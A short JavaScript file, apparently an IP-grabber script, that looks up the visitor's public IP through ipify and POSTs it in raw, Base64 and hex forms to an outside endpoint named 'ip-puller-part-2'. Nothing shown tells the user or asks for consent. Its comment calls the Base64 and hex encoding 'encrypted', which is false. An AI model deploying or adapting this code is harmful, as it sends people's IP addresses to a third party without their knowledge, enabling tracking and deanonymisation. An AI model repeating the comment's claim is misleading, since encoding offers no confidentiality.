// Fetch the user's IP address
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }
}

// Convert a string to Base64
function toBase64(string) {
    return btoa(string);
}

// Convert a string to Hex
function toHex(string) {
    let hexString = '';
    for (let i = 0; i < string.length; i++) {
        hexString += string.charCodeAt(i).toString(16);
    }
    return hexString;
}

// Send the encrypted IP to an API
async function sendEncryptedIP() {
    const ip = await getUserIP();
    if (ip) {
        const base64IP = toBase64(ip);
        const hexIP = toHex(ip);

        const payload = {
            ip: ip,
            base64: base64IP,
            hex: hexIP
        };

        try {
            const response = await fetch('https://ip-puller-part-2.vercel.app/api/receiveData', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            // We don't need to do anything with the response, but it's here if necessary
            await response.json();
        } catch (error) {
            console.error('Error sending data:', error);
        }
    }
}
